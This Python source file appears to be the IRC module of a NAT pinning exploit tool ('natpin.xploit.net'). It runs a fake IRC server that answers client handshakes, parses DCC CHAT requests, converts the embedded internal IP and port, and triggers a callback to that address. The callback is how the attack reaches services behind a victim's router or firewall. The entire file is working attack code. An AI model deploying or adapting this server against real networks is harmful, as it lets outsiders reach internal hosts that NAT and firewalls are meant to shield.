#!/usr/bin/env python
#filename=irc.py
from base import *
import socket
import random
import struct
import select

class IRCProtoHandler(asyncore.dispatcher_with_send):
	def __init__(self,conn_sock, client_address, server):
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort))
		self.send(self.server.IRC_NAME + " NOTICE AUTH :*** Looking up your hostname...\r\n")
	def handle_read(self):
		request = self.recv(1024).strip()
		if (request == ""): return
		parts = request.split(" ")
		if parts[0]=="NICK":
			self.send(":"+self.server.IRC_NAME+" 376 natpin252 :End of /MOTD command.\r\n")
		elif parts[0]=="PRIVMSG":
			if parts[3] == "CHAT":
				numip = long(parts[5])
				numip = socket.inet_ntoa(struct.pack('!I', numip))		
				numport = parts[6].replace("\x01","")
				self.server.log("IRC Received DCC CHAT callback request for " + str(numip) + " on port " + str(numport))
					#this is where callback needs to happen
				self.server.callback("IRC", self.server.CB_TYPE,numip,int(numport))
				if self.server.EXIT_ON_CB == 1:
					self.close()
			#end if
		else:
			self.server.log("Invalid input :" + request)
#end class



class Server(Base):
	def __init__(self,serverPort=6667,sCallbackType="socket", verbose=False):
		self.EXIT_ON_CB = 1
		self.CB_TYPE=sCallbackType
		self.IRC_NAME="natpin.xploit.net"
		self.TYPE = "IRC Server"
		Base.__init__(self,"TCP",serverPort,sCallbackType,verbose)
		self.log("Started")
	#end def
	def protocolhandler(self,conn, addr):
		self.HANDLER = IRCProtoHandler(conn,addr,self)
	#end def
#end class
